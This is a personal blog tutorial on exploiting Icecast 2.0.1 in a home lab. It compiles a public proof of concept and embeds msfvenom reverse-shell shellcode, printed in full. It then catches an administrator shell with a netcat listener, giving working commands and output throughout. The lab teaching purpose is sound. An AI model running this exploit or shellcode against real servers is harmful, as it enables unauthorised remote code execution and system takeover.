<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="generator" content="Hugo 0.80.0" />


<title>Exploiting Icecast 2.0.1 with Proof of Concept - Parker McGee</title>
<meta property="og:title" content="Exploiting Icecast 2.0.1 with Proof of Concept - Parker McGee">



  






<link rel="stylesheet" href="/css/main.css" media="all">
<link rel="stylesheet" href="/css/fonts.css">

  </head>
  <body>
    <div class="wrapper">
      <header class="header">
        <nav class="nav">
  <a href="/" class="nav-logo">
    Parker McGee
  </a>

  <ul class="nav-links">
    
    <li><a href="/about/">About</a></li>
    
  </ul>
</nav>

      </header>


<main class="content" role="main">
  <article class="article">
    <h1 class="article-title">Exploiting Icecast 2.0.1 with Proof of Concept</h1>
    
    <span class="article-date">February 13, 2019</span>
    

    
      <nav id="TableOfContents"></nav>
    

    <div class="article-content">
      <p><a href="/exploiting-icecast-2.0.1-with-metasploit/">In the last post</a>, we looked at exploiting <a href="http://icecast.org/">Icecast</a> with Metasploit. For this tutorial, you should follow the <a href="/exploiting-icecast-2.0.1-with-metasploit/#setup">&ldquo;Setup&rdquo; and &ldquo;Setting up Icecast&rdquo; sections from the last post</a> before continuing.</p>
<h1 id="proof-of-concept">Proof of Concept</h1>
<p>Many exploits that are shared with the public are released with &ldquo;proof of concept&rdquo; code that prove those exploits work. By utilizing these proofs of concept, it&rsquo;s possible to exploit a vulnerability before a more major tool, such as Metasploit, has implemented it in it&rsquo;s toolchain.</p>
<p>When the Icecast 2.0.1 vulnerability was released, the researcher that discovered it released a proof of concept to demonstrate the vulnerability. We&rsquo;re going to look at that proof of concept in this post.</p>
<h1 id="downloading-the-proof-of-concept">Downloading the Proof of Concept</h1>
<p>Thankfully, that proof of concept is still available. To get started, download it from the author&rsquo;s website:</p>
<pre><code>root@kali:~/icecast# wget https://aluigi.altervista.org/poc/iceexec.zip
--2019-01-14 19:39:37--  https://aluigi.altervista.org/poc/iceexec.zip
Resolving aluigi.altervista.org (aluigi.altervista.org)... 176.9.82.46
Connecting to aluigi.altervista.org (aluigi.altervista.org)|176.9.82.46|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7967 (7.8K) [application/zip]
Saving to: ‘iceexec.zip’

iceexec.zip                                 100%[==========================================================================================&gt;]   7.78K  --.-KB/s    in 0s

2019-01-14 19:39:38 (186 MB/s) - ‘iceexec.zip’ saved [7967/7967]

root@kali:~/icecast# unzip iceexec.zip
Archive:  iceexec.zip
  inflating: iceexec.c
  inflating: iceexec.exe
  inflating: winerr.h

root@kali:~/icecast# ls
iceexec.c  iceexec.exe  iceexec.zip  winerr.h
</code></pre>
<p>You can see here that the author provided three files in the iceexec.zip archive. The one we&rsquo;re most interested in is iceexec.c, a C file that implements code which exploits the vulnerability. Go ahead and open it. It&rsquo;s okay if you don&rsquo;t understand all of it. As you progress down this path, you&rsquo;ll want to learn C so you can understand what the code is doing and change it to suit your needs, but for now, you do not need to know C to follow the rest of this tutorial.</p>
<h1 id="building-and-testing">Building and Testing</h1>
<p>Let&rsquo;s try it out to see what it does. In your Windows VM, ensure everything is properly set up, the firewall has been disabled, and Icecast has been started. If this isn&rsquo;t the case, go to my previous post and follow the setup instructions.</p>
<p>Let&rsquo;s build the proof of concept code in Kali:</p>
<pre><code>root@kali:~/icecast# gcc -o iceexec iceexec.c
</code></pre>
<p>This does not give any output, but if you run <code>ls</code>, you&rsquo;ll see that a new file <code>iceexec</code> has been generated. This is the executable file generated from the proof-of-concept code.</p>
<p>Now let&rsquo;s run it against the Windows server to see if it works:</p>
<pre><code>root@kali:~/icecast# ./iceexec 192.168.94.130
Icecast &lt;= 2.0.1 Win32 remote code execution 0.1
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    aluigi.org

- target   192.168.94.130:8000
- send malformed data
Server IS vulnerable!!!
</code></pre>
<p>You can see here that the proof-of-concept code ran and proved that the server was vulnerable. But it didn&rsquo;t actually do anything useful. That&rsquo;s because this code is written to exploit the vulnerability, prove that code can be run against the server, but it does not run any useful code.</p>
<h1 id="generating-the-shellcode">Generating the Shellcode</h1>
<p><a href="https://en.wikipedia.org/wiki/Shellcode">Shellcode</a> is the code run when exploiting a vulnerability in a piece of software. When you exploit a vulnerability, often that vulnerability will allow a small amount of code to be &ldquo;injected&rdquo; into the running process.</p>
<p>For an executable program like Icecast, that code needs to be in the form of machine-level instructions. If you wanted to write your own shellcode, you would often write these instructions in the form of <a href="https://en.wikipedia.org/wiki/Assembly_language">assembly</a> or C, which is outside the scope of this tutorial.</p>
<p>For this tutorial, we&rsquo;ll be using a utility built into Metasploit, <code>msfvenom</code>, to generate the shellcode for us:</p>
<pre><code>root@kali:~/icecast# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.94.129 LPORT=4443 -f c -b '\x00\x0a\x0d'
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] =
&quot;\xba\xbc\xa7\xbb\xcc\xdd\xc7\xd9\x74\x24\xf4\x58\x29\xc9\xb1&quot;
&quot;\x52\x31\x50\x12\x83\xc0\x04\x03\xec\xa9\x59\x39\xf0\x5e\x1f&quot;
&quot;\xc2\x08\x9f\x40\x4a\xed\xae\x40\x28\x66\x80\x70\x3a\x2a\x2d&quot;
&quot;\xfa\x6e\xde\xa6\x8e\xa6\xd1\x0f\x24\x91\xdc\x90\x15\xe1\x7f&quot;
&quot;\x13\x64\x36\x5f\x2a\xa7\x4b\x9e\x6b\xda\xa6\xf2\x24\x90\x15&quot;
&quot;\xe2\x41\xec\xa5\x89\x1a\xe0\xad\x6e\xea\x03\x9f\x21\x60\x5a&quot;
&quot;\x3f\xc0\xa5\xd6\x76\xda\xaa\xd3\xc1\x51\x18\xaf\xd3\xb3\x50&quot;
&quot;\x50\x7f\xfa\x5c\xa3\x81\x3b\x5a\x5c\xf4\x35\x98\xe1\x0f\x82&quot;
&quot;\xe2\x3d\x85\x10\x44\xb5\x3d\xfc\x74\x1a\xdb\x77\x7a\xd7\xaf&quot;
&quot;\xdf\x9f\xe6\x7c\x54\x9b\x63\x83\xba\x2d\x37\xa0\x1e\x75\xe3&quot;
&quot;\xc9\x07\xd3\x42\xf5\x57\xbc\x3b\x53\x1c\x51\x2f\xee\x7f\x3e&quot;
&quot;\x9c\xc3\x7f\xbe\x8a\x54\x0c\x8c\x15\xcf\x9a\xbc\xde\xc9\x5d&quot;
&quot;\xc2\xf4\xae\xf1\x3d\xf7\xce\xd8\xf9\xa3\x9e\x72\x2b\xcc\x74&quot;
&quot;\x82\xd4\x19\xda\xd2\x7a\xf2\x9b\x82\x3a\xa2\x73\xc8\xb4\x9d&quot;
&quot;\x64\xf3\x1e\xb6\x0f\x0e\xc9\x79\x67\x4e\x88\x12\x7a\x6e\x9b&quot;
&quot;\xb9\xf3\x88\xf1\x2d\x52\x03\x6e\xd7\xff\xdf\x0f\x18\x2a\x9a&quot;
&quot;\x10\x92\xd9\x5b\xde\x53\x97\x4f\xb7\x93\xe2\x2d\x1e\xab\xd8&quot;
&quot;\x59\xfc\x3e\x87\x99\x8b\x22\x10\xce\xdc\x95\x69\x9a\xf0\x8c&quot;
&quot;\xc3\xb8\x08\x48\x2b\x78\xd7\xa9\xb2\x81\x9a\x96\x90\x91\x62&quot;
&quot;\x16\x9d\xc5\x3a\x41\x4b\xb3\xfc\x3b\x3d\x6d\x57\x97\x97\xf9&quot;
&quot;\x2e\xdb\x27\x7f\x2f\x36\xde\x9f\x9e\xef\xa7\xa0\x2f\x78\x20&quot;
&quot;\xd9\x4d\x18\xcf\x30\xd6\x28\x9a\x18\x7f\xa1\x43\xc9\x3d\xac&quot;
&quot;\x73\x24\x01\xc9\xf7\xcc\xfa\x2e\xe7\xa5\xff\x6b\xaf\x56\x72&quot;
&quot;\xe3\x5a\x58\x21\x04\x4f&quot;;
</code></pre>
<p>There&rsquo;s a lot going on there, so let me take some time to explain what just happened.</p>
<p>We used <code>msfvenom</code> to generate a shellcode for us. The shellcode contains the <code>windows/shell_reverse_tcp</code> payload, which is similar to the payload we used in the last post. We are not using meterpreter this time because we are trying to avoid the Metasploit tools as much as possible. This payload connects a simple shell back to the listening host. We provided the same payload options as the last post. Don&rsquo;t forget to change the IP address here to the IP address of your Kali VM.</p>
<p>The <code>-b '\x00\x0a\x0d'</code> tells which characters to avoid in the shellcode. Depending on how the exploit is delivered, certain characters need to be avoided. In the Icecast case, because the delivery is over HTTP, specific characters, NULL, new line, and carriage return, need to be avoided.</p>
<p>In this case, <code>msfvenom</code> took our specifications and generated machine code in a form that can be embedded into a C program.</p>
<h1 id="editing-the-proof-of-concept">Editing the Proof of Concept</h1>
<p>Now, let&rsquo;s use this shellcode in the proof of concept. Open <code>iceexec.c</code> and change the <code>#define EXEC</code> block of text to use the shellcode:</p>
<pre><code>#define EXEC    &quot;GET / HTTP/1.0\r\n&quot; \
&quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; \
&quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; \
&quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; \
&quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; \
&quot;\xba\xbc\xa7\xbb\xcc\xdd\xc7\xd9\x74\x24\xf4\x58\x29\xc9\xb1&quot; \
&quot;\x52\x31\x50\x12\x83\xc0\x04\x03\xec\xa9\x59\x39\xf0\x5e\x1f&quot; \
&quot;\xc2\x08\x9f\x40\x4a\xed\xae\x40\x28\x66\x80\x70\x3a\x2a\x2d&quot; \
&quot;\xfa\x6e\xde\xa6\x8e\xa6\xd1\x0f\x24\x91\xdc\x90\x15\xe1\x7f&quot; \
&quot;\x13\x64\x36\x5f\x2a\xa7\x4b\x9e\x6b\xda\xa6\xf2\x24\x90\x15&quot; \
&quot;\xe2\x41\xec\xa5\x89\x1a\xe0\xad\x6e\xea\x03\x9f\x21\x60\x5a&quot; \
&quot;\x3f\xc0\xa5\xd6\x76\xda\xaa\xd3\xc1\x51\x18\xaf\xd3\xb3\x50&quot; \
&quot;\x50\x7f\xfa\x5c\xa3\x81\x3b\x5a\x5c\xf4\x35\x98\xe1\x0f\x82&quot; \
&quot;\xe2\x3d\x85\x10\x44\xb5\x3d\xfc\x74\x1a\xdb\x77\x7a\xd7\xaf&quot; \
&quot;\xdf\x9f\xe6\x7c\x54\x9b\x63\x83\xba\x2d\x37\xa0\x1e\x75\xe3&quot; \
&quot;\xc9\x07\xd3\x42\xf5\x57\xbc\x3b\x53\x1c\x51\x2f\xee\x7f\x3e&quot; \
&quot;\x9c\xc3\x7f\xbe\x8a\x54\x0c\x8c\x15\xcf\x9a\xbc\xde\xc9\x5d&quot; \
&quot;\xc2\xf4\xae\xf1\x3d\xf7\xce\xd8\xf9\xa3\x9e\x72\x2b\xcc\x74&quot; \
&quot;\x82\xd4\x19\xda\xd2\x7a\xf2\x9b\x82\x3a\xa2\x73\xc8\xb4\x9d&quot; \
&quot;\x64\xf3\x1e\xb6\x0f\x0e\xc9\x79\x67\x4e\x88\x12\x7a\x6e\x9b&quot; \
&quot;\xb9\xf3\x88\xf1\x2d\x52\x03\x6e\xd7\xff\xdf\x0f\x18\x2a\x9a&quot; \
&quot;\x10\x92\xd9\x5b\xde\x53\x97\x4f\xb7\x93\xe2\x2d\x1e\xab\xd8&quot; \
&quot;\x59\xfc\x3e\x87\x99\x8b\x22\x10\xce\xdc\x95\x69\x9a\xf0\x8c&quot; \
&quot;\xc3\xb8\x08\x48\x2b\x78\xd7\xa9\xb2\x81\x9a\x96\x90\x91\x62&quot; \
&quot;\x16\x9d\xc5\x3a\x41\x4b\xb3\xfc\x3b\x3d\x6d\x57\x97\x97\xf9&quot; \
&quot;\x2e\xdb\x27\x7f\x2f\x36\xde\x9f\x9e\xef\xa7\xa0\x2f\x78\x20&quot; \
&quot;\xd9\x4d\x18\xcf\x30\xd6\x28\x9a\x18\x7f\xa1\x43\xc9\x3d\xac&quot; \
&quot;\x73\x24\x01\xc9\xf7\xcc\xfa\x2e\xe7\xa5\xff\x6b\xaf\x56\x72&quot; \
&quot;\xe3\x5a\x58\x21\x04\x4f&quot; \
&quot;\r\n\r\n&quot;
</code></pre>
<p>If <code>msfvenom</code> generated different shellcode for you above, you should swap out my shellcode for the shellcode it generated. Make sure you provide the <code>\</code> at the end of each line so that the program compiles.</p>
<p>Once the editing is done, save the file and let&rsquo;s compile it again:</p>
<pre><code>root@kali:~/icecast# gcc -o iceexec iceexec.c
</code></pre>
<p>If that returns an error, look at the program and see what might be the problem. Try hard and Google the errors if you need. Errors like these are a great opportunity to learn more.</p>
<p>Don&rsquo;t run it quite yet, as there&rsquo;s still a little bit of setup left.</p>
<h1 id="running-the-exploit">Running the Exploit</h1>
<p>When the shellcode is run, it connects to the IP address on the port you provided to <code>msfvenom</code>. Your Kali VM doesn&rsquo;t have anything listening there by default, so we&rsquo;re going to use the great <a href="https://en.wikipedia.org/wiki/Netcat">Netcat</a> command, <code>nc</code>, to start a server listening on that port. Run this command in a new Terminal window, as it needs to stay running when you run <code>iceexec</code>:</p>
<pre><code>root@kali:~/icecast# nc -nlvp 4443
listening on [any] 4443 ...
</code></pre>
<p>Now, let&rsquo;s execute our exploit and see if it works. Remember to stop and start Icecast if you haven&rsquo;t done so since the last run of <code>iceexec</code>:</p>
<pre><code>root@kali:~/icecast# ./iceexec 192.168.94.130
Icecast &lt;= 2.0.1 Win32 remote code execution 0.1
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    aluigi.org

- target   192.168.94.130:8000
- send malformed data
Server IS vulnerable!!!
</code></pre>
<p>That looks the same. What happened? Change over to the Terminal window where you&rsquo;re running <code>nc</code>:</p>
<pre><code>root@kali:~/icecast# nc -nlvp 4443
listening on [any] 4443 ...
connect to [192.168.94.129] from (UNKNOWN) [192.168.94.130] 1557
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
C:\Program Files (x86)\Icecast2 Win32&gt;whoami
whoami
win-i13isv85q18\administrator
C:\Program Files (x86)\Icecast2 Win32&gt;
</code></pre>
<p>A shell to your Windows server, generated by the shellcode you created, exploited via the proof-of-concept code for the vulnerability.</p>
<p>If you experience trouble with any of this, that&rsquo;s normal. Exploiting vulnerabilities is tricky, because the code wasn&rsquo;t designed to do this. Review any errors you see, review my setup guide again in the previous post, think critically about what&rsquo;s happening, reset the environments, try again. The more you try, the more you&rsquo;ll learn.</p>

    </div>
 
    <ul class="article-taxonomy">
      
    
      
  </article>

</main>

      <footer class="footer">
        <ul class="footer-links">
          <li>
            <a href="/index.xml" type="application/rss+xml" target="_blank"><i class="fa fa-rss"></i> RSS feed</a>
          </li>
          <li>
            <a href="https://github.com/pgmcgee"><i class="fa fa-github"></i> Code</a>
          </li>
          <li>
            <a href="https://twitter.com/pgmcgee"><i class="fa fa-twitter"></i> Twitter</a>
          </li>
        </ul>
      </footer>

    </div>

  </body>
</html>

